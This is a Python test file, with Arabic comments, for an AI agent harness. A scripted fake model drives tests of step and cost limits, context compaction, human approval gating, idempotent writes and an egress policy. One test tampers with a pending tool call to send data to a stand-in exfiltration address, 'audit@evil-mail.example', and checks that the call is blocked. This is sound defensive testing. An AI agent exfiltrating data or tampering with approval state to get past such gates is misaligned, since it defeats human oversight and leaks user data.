"""
اختبارات حتمية للـ harness: حد الخطوات، حد التكلفة لكل طلب، الميزانية اليومية، ضغط السياق،
Reject/Approve، عدم تكرار الكتابة، وأن الموافقة لا تتجاوز سياسة منع التسريب.

النموذج هنا "مُبرمج" (FakeLLM) لاختبار منطق الـ harness فقط — ليس دليلًا على سلوك نموذج حقيقي.
أدوات الكتابة تُنفذ عبر خادم MCP الحقيقي (stdio) على ملف مؤقت.
التشغيل:  python -X utf8 tests/test_harness.py
"""
import copy
import json
import os
import sys
import tempfile
from types import SimpleNamespace as NS

TMP = tempfile.mkdtemp()
os.environ["MADAR_ALERTS_FILE"] = os.path.join(TMP, "alerts.jsonl")
os.environ["MADAR_COST_LEDGER"] = os.path.join(TMP, "ledger.jsonl")
os.environ.setdefault("OPENROUTER_API_KEY", "unused-by-fake-client")
ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)

import agent  # noqa: E402

ALERTS = os.environ["MADAR_ALERTS_FILE"]


def n_alerts():
    return sum(1 for _ in open(ALERTS, encoding="utf-8")) if os.path.exists(ALERTS) else 0


def tool_call(name, args, i=[0]):
    i[0] += 1
    return NS(id=f"call_{i[0]}", function=NS(name=name, arguments=json.dumps(args, ensure_ascii=False)))


class FakeLLM:
    """يعيد ردودًا مُبرمجة بالترتيب؛ ويسجل الرسائل المرسلة إليه."""
    def __init__(self, script, cost=0.001):
        self.script, self.cost, self.seen = list(script), cost, []
        self.chat = NS(completions=NS(create=self.create))

    def create(self, model, messages, **kw):
        self.seen.append(messages)
        item = self.script.pop(0) if self.script else self.script_default
        calls = item if isinstance(item, list) else None
        msg = NS(content=None if calls else item, tool_calls=calls)
        return NS(choices=[NS(message=msg)], usage=NS(prompt_tokens=10, completion_tokens=5, cost=self.cost))


def use(fake):
    agent._client = fake
    return fake


def reset_ledger():
    if os.path.exists(os.environ["MADAR_COST_LEDGER"]):
        os.remove(os.environ["MADAR_COST_LEDGER"])


RESULTS = []


def check(name, cond, detail=""):
    RESULTS.append((name, bool(cond)))
    print(("PASS " if cond else "FAIL ") + name + (f" — {detail}" if detail else ""))


def test_step_limit():
    fake = FakeLLM([], cost=0.0)
    fake.script_default = [tool_call("read_context", {})]
    use(fake)
    st = agent.run_agent("loop forever")
    check("step limit stops the loop", st["status"] == "step_limit" and st["llm_calls"] == agent.MAX_STEPS,
          f"status={st['status']} llm_calls={st['llm_calls']} MAX_STEPS={agent.MAX_STEPS}")


def test_cost_budget():
    reset_ledger()
    fake = FakeLLM([], cost=0.03)
    fake.script_default = [tool_call("read_context", {})]
    use(fake)
    st = agent.run_agent("expensive")
    check("per-request cost budget stops the loop", st["status"] == "budget_exceeded" and st["llm_calls"] == 2,
          f"status={st['status']} llm_calls={st['llm_calls']} cost={st['cost']:.2f} limit={agent.MAX_COST_USD}")


def test_daily_budget():
    reset_ledger()
    with open(os.environ["MADAR_COST_LEDGER"], "w", encoding="utf-8") as f:
        f.write(json.dumps({"date": agent.time.strftime("%Y-%m-%d"), "cost": agent.DAILY_BUDGET_USD}) + "\n")
    use(FakeLLM(["hi"]))
    st = agent.run_agent("anything")
    check("daily budget blocks before any LLM call", st["status"] == "budget_exceeded" and st["llm_calls"] == 0,
          f"status={st['status']} llm_calls={st['llm_calls']}")
    reset_ledger()


def test_compaction():
    old = agent.MAX_CONTEXT_CHARS
    agent.MAX_CONTEXT_CHARS = 2000
    fake = use(FakeLLM([[tool_call("read_context", {})], [tool_call("read_context", {})],
                        [tool_call("read_context", {})], [tool_call("read_context", {})], "done"]))
    st = agent.run_agent("read a lot")
    agent.MAX_CONTEXT_CHARS = old
    last = fake.seen[-1]
    compacted = [m for m in last if m["role"] == "tool" and "[compacted]" in str(m["content"])]
    check("context compaction shrinks old tool outputs",
          any(t.get("event") == "context_compacted" for t in st["trace"]) and compacted,
          f"compacted_msgs={len(compacted)}")


def _pending(recipient="self"):
    use(FakeLLM([[tool_call("create_alert", {"title": "t", "message": "m", "recipient": recipient})], "ok"]))
    return agent.run_agent("create an alert")


def test_reject_and_approve_once():
    st = _pending()
    before = n_alerts()
    check("write pauses before execution", st["status"] == "pending_approval" and n_alerts() == before)
    st = agent.resume_agent(st, approved=False)
    check("Reject does not write", n_alerts() == before)

    st = _pending()
    replay = copy.deepcopy(st)  # نسخة من نفس الطلب المعلّق (إعادة إرسال الموافقة)
    use(FakeLLM(["ok"]))
    agent.resume_agent(st, approved=True)
    check("Approve writes exactly once", n_alerts() == before + 1)
    try:
        agent.resume_agent(st, approved=True)
        second = "no error"
    except ValueError:
        second = "ValueError"
    check("second Approve on same run is refused", second == "ValueError")
    use(FakeLLM(["ok"]))
    out = agent.resume_agent(replay, approved=True)
    dup = [t for t in out["trace"] if t.get("event") == "human_approved"][0]["result"]
    check("replayed Approve is idempotent (no second write)", n_alerts() == before + 1 and '"duplicate": true' in dup)


def test_duplicate_write_in_same_request():
    # يحاكي سلوك النموذج B المسجل في results/traces/B_T12_r0.json: يكرر نفس create_alert بعد EXECUTED
    args = {"title": "dup", "message": "same", "recipient": "self"}
    use(FakeLLM([[tool_call("create_alert", args)], [tool_call("create_alert", args)],
                 [tool_call("create_alert", args)], "done"]))
    before = n_alerts()
    st = agent.run_agent("create one alert")
    approvals = 0
    while st["status"] == "pending_approval":
        approvals += 1
        st = agent.resume_agent(st, approved=True)
    blocked = sum(t.get("event") == "duplicate_write_blocked" for t in st["trace"])
    check("identical write repeated in one request runs once", n_alerts() == before + 1 and approvals == 1 and blocked == 2,
          f"writes={n_alerts() - before} approvals={approvals} duplicates_blocked={blocked}")


def test_approval_cannot_bypass_egress():
    before = n_alerts()
    st = _pending()  # طلب سليم ثم نعدّل المستلم كما لو أن الحالة تلاعب بها أحد
    st["pending"][0]["args"]["recipient"] = "audit@evil-mail.example"
    use(FakeLLM(["ok"]))
    st = agent.resume_agent(st, approved=True)
    blocked = any(t.get("event") == "egress_blocked_after_approval" for t in st["trace"])
    check("Approve cannot bypass the egress policy", blocked and n_alerts() == before)

    st = _pending("audit@evil-mail.example")
    check("exfil call is blocked before reaching the human gate",
          st["status"] != "pending_approval" and n_alerts() == before
          and any(t.get("event") == "egress_blocked" for t in st["trace"]))


def test_server_double_approve():
    from fastapi.testclient import TestClient
    import server
    c = TestClient(server.app)
    use(FakeLLM([[tool_call("create_alert", {"title": "t", "message": "m", "recipient": "self"})], "ok"]))
    before = n_alerts()
    r = c.post("/process", json={"command": "alert"}).json()
    use(FakeLLM(["ok"]))
    r1 = c.post("/approve", json={"run_id": r["run_id"], "approved": True})
    r2 = c.post("/approve", json={"run_id": r["run_id"], "approved": True})
    check("API: second /approve returns 404 and writes nothing",
          r1.status_code == 200 and r2.status_code == 404 and n_alerts() == before + 1)


if __name__ == "__main__":
    for fn in [test_step_limit, test_cost_budget, test_daily_budget, test_compaction,
               test_reject_and_approve_once, test_duplicate_write_in_same_request,
               test_approval_cannot_bypass_egress, test_server_double_approve]:
        fn()
    passed = sum(ok for _, ok in RESULTS)
    print(f"\n{passed}/{len(RESULTS)} harness tests passed")
    sys.exit(0 if passed == len(RESULTS) else 1)
